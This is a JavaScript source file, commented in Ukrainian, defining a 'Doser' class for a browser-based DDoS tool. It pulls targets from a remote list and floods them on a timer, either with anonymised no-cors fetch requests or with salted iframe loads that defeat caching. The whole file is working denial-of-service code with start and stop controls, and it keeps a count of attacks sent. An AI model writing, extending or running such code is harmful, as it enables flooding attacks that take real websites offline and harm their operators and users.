class Doser {
    async start(isFetch=false) {
    	this.attack = true; // Статус атаки

        // Запуск атаки

        btn.text("Стоп");
        const target = await getTarget();

        if (setTarget(target)) {
        	// Якщо не завнтажились цілі

        	this.attack = false;
        	btn.text("Старт!");
        	return; // Стоп
        };
        console.log(target);

        this.interval /*Цикл DDoS-атаки*/ = setInterval(isFetch ? async () => {
            // Запити

            await fetch([target.page], {
	            method: target.method,
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer'
	        })
	        .catch(()=>{})

	        .then(() => {
	            // Після запиту

	            console.log("Ok!");
	            add_count();
	        })
        } : async () => {

        	const targett = await getSalt(target.page); // Беремо сіль з нашого Криму

        	// Надсилання запиту на сайт за допомогою елементу iframe
        	await Frames.draw(targett);
        	console.log(targett);

        	add_count();

        	if ($("#frames")[0].childElementCount >= 200) {Frames.clear()};
        }, attackInterval);

        this.saver /*Цикл збереження данних про кількість атак*/ = setInterval(() => {
        	Database.attacks = parseInt(Database.attacks) + 15
        	console.log("Saved!");
        }, saverInterval);
    };
    stop() {
    	if (this.interval) {
	    	this.attack = false;
	    	clearInterval(this.interval);
	    	clearInterval(this.saver);
	    	Frames.clear();
	    	btn.text("Старт!")
    	}
    };
}